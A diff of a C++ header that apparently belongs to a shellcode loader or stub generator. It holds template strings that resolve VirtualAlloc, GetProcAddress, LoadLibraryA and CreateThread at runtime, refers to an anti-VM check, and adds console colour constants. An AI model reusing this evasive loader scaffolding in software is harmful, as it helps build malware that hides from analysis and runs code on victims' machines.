@@ -1,8 +1,19 @@
 // constants.h
+// Contains the strings for stub options
+// The function definition and call to that function are inserted over the placeholders in
+// the stub template when the flag is used
 #ifndef CONSTANTS_H
 #define CONSTANTS_H
 
-#include <string>
+#include <string>   
+
+const size_t LEN = 16;
+
+const int COLOR_DEFAULT = 15; // 15/7
+const int COLOR_SUCCESS = 10;
+const int COLOR_ERROR = 12;
+const int COLOR_WARNING = 14;
+const int COLOR_INFO = 14; // 14/11
 
 const std::string DYN_GLOBALS = R"(
 typedef LPVOID (WINAPI *VirtualAlloc_t)(LPVOID, SIZE_T, DWORD, DWORD);
@@ -34,6 +45,14 @@ const std::string DYN_RESOLUTION = R"(
     /**/
 
     // Resolve each function explicitly
+    pGetProcAddress = (GetProcAddress_t)GetProcAddress(kernel32, "GetProcAddress");
+    if (!pGetProcAddress) {
+        cerr << "Failed to resolve GetProcAddress with error: " << GetLastError() << "\n";
+        /*DEBUG*/
+        return;
+    } else {
+        cout << "Resolved pGetProcAddress at address: " << (void*)pGetProcAddress << "\n";
+    }
     pVirtualAlloc = (VirtualAlloc_t)GetProcAddress(kernel32, "VirtualAlloc");
     if (!pVirtualAlloc) {
         cerr << "Failed to resolve VirtualAlloc with error: " << GetLastError() << "\n";
@@ -56,14 +75,6 @@ const std::string DYN_RESOLUTION = R"(
         return;
     } else {
         cout << "Resolved pLoadLibraryA at address: " << (void*)pLoadLibraryA << "\n";
-    }
-
-    pGetProcAddress = (GetProcAddress_t)GetProcAddress(kernel32, "GetProcAddress");
-    if (!pGetProcAddress) {
-        cerr << "Failed to resolve GetProcAddress with error: " << GetLastError() << "\n";
-        return;
-    } else {
-        cout << "Resolved pGetProcAddress at address: " << (void*)pGetProcAddress << "\n";
     }
 
     pCreateThread = (CreateThread_t)GetProcAddress(kernel32, "CreateThread");
@@ -246,4 +257,4 @@ void antiVm(){
 }
 )";
 
-#endif // CONSTANTS_H
+#endif // CONSTANTS_Hk
